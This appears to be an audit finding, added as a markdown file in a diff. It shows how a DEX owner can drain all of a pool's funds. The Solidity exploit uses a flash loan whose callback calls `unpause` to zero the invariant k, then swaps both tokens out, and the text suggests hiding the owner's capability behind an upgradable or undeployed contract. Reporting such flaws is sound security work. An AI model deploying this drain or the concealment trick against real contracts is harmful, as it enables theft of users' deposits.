@@ -1,0 +1,32 @@
+The owner can drain all the funds through a flash loan and manipulating the fact that `unpause` calls sync!
+
+All they need to do is:
+1. give the owner some tokens to pay for the flash loan fee.
+2. set the owner to a contract that has the following body:
+
+```
+    function attack() external {
+        dex.flashLoan(IERC3156FlashBorrower(address(this)), dex.token1(), dex.token1().balanceOf(address(dex)), "");
+        dex.swap(dex.token2(), 0, dex.token1(), dex.token1().balanceOf(address(dex)));
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns(bytes32) {
+        dex.unpause(); // Sets k to 0
+        dex.swap(dex.token1(), 0, dex.token2(), dex.token2().balanceOf(address(dex)));
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+```
+
+Extra sneaky points if the owner is an upgradable contract, or a still
+undeployed contract, so that it's not obvious what it can do.
+
+3. trigger the `attack` function.
+
+After the flash loan concludes in the first line of `attack`, the `k` in the DEX is 0, and the balance of `token2` has been completely drained.
+The full balance of `token1` remains, plus the fee, but the attacker can simply call another swap, again depositing no tokens, and take the remaining balance.
